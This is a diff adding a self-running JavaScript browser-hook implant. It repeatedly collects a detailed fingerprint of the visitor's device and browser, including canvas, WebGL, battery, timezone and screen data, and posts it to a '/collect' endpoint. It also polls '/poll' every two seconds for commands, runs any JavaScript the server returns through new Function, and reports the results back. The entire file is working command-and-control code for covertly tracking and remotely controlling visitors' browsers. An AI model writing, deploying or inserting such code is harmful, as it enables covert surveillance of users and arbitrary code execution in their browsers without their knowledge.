@@ -1,0 +1,51 @@
+(function(){
+var __pzCid="{{cid}}";window.__pzCid=__pzCid;
+function __pzExec(cmd){
+  var result;
+  try{
+    var fn=new Function('__pzResult','__pzCid',cmd.js);
+    var r=fn(function(val){
+      fetch('/result',{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({cid:__pzCid,cmd_id:cmd.id,result:val})});
+    },__pzCid);
+    if(r==='__async__')return;
+    result=(r!==undefined)?r:'ok';
+  }catch(e){result='ERROR: '+e.message;}
+  fetch('/result',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({cid:__pzCid,cmd_id:cmd.id,result:result})});
+}
+function __pzParseBrowser(ua){
+  var name='Unknown',version='?',engine='?';var m;
+  if(/Edg\//.test(ua)){name='Edge';m=ua.match(/Edg\/([\d.]+)/);version=m?m[1]:'?';engine='Blink';}
+  else if(/OPR\//.test(ua)){name='Opera';m=ua.match(/OPR\/([\d.]+)/);version=m?m[1]:'?';engine='Blink';}
+  else if(/Chrome\//.test(ua)){name='Chrome';m=ua.match(/Chrome\/([\d.]+)/);version=m?m[1]:'?';engine='Blink';}
+  else if(/Firefox\//.test(ua)){name='Firefox';m=ua.match(/Firefox\/([\d.]+)/);version=m?m[1]:'?';engine='Gecko';}
+  else if(/Version\/[\d.]+.*Safari/.test(ua)){name='Safari';m=ua.match(/Version\/([\d.]+)/);version=m?m[1]:'?';engine='WebKit';}
+  else{m=ua.match(/([\w]+)\/([\d.]+)/);if(m){name=m[1];version=m[2];}}
+  var major=version.split('.')[0];
+  return{name:name,version:version,major:parseInt(major)||0,engine:engine,full:name+' '+version};
+}
+async function __pzCollect(){
+  var bat=null;
+  if(navigator.getBattery){try{var b=await navigator.getBattery();bat={charging:b.charging,level:b.level};}catch(e){}}
+  var stor=null;
+  if(navigator.storage){try{stor=await navigator.storage.estimate();}catch(e){}}
+  function webgl(){try{var c=document.createElement('canvas'),gl=c.getContext('webgl'),d=gl.getExtension('WEBGL_debug_renderer_info');return{vendor:gl.getParameter(d.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(d.UNMASKED_RENDERER_WEBGL)};}catch(e){return null;}}
+  function cfp(){try{var c=document.createElement('canvas'),x=c.getContext('2d');x.font='14px Arial';x.fillText('pz',2,2);return c.toDataURL().slice(-20);}catch(e){return null;}}
+  fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
+    navigator:{userAgent:navigator.userAgent,platform:navigator.platform,vendor:navigator.vendor,webdriver:navigator.webdriver,language:navigator.language,languages:navigator.languages,doNotTrack:navigator.doNotTrack,hardwareConcurrency:navigator.hardwareConcurrency,deviceMemory:navigator.deviceMemory||null,maxTouchPoints:navigator.maxTouchPoints,cookiesEnabled:navigator.cookieEnabled},
+    browser:__pzParseBrowser(navigator.userAgent),
+    screen:{width:screen.width,height:screen.height,availWidth:screen.availWidth,availHeight:screen.availHeight,colorDepth:screen.colorDepth,pixelRatio:devicePixelRatio},
+    window:{innerWidth:innerWidth,innerHeight:innerHeight,outerWidth:outerWidth,outerHeight:outerHeight,visibility:document.visibilityState,hasFocus:document.hasFocus()},
+    preferences:{dark:matchMedia('(prefers-color-scheme:dark)').matches,reducedMotion:matchMedia('(prefers-reduced-motion:reduce)').matches,hdr:matchMedia('(dynamic-range:high)').matches,pointerCoarse:matchMedia('(pointer:coarse)').matches,hover:matchMedia('(hover:hover)').matches},
+    time:{tz:Intl.DateTimeFormat().resolvedOptions().timeZone,offset:new Date().getTimezoneOffset(),locale:new Date().toLocaleString()},
+    storage:stor,battery:bat,webgl:webgl(),canvasFP:cfp(),
+    webrtc:typeof RTCPeerConnection!=='undefined',historyLength:history.length,referrer:document.referrer
+  })});
+}
+async function __pzPoll(){
+  try{var r=await fetch('/poll/'+__pzCid);var j=await r.json();if(j.cmd)await __pzExec(j.cmd);}catch(e){}
+  setTimeout(__pzPoll,2000);
+}
+setInterval(__pzCollect,8000);__pzCollect();__pzPoll();
+})();
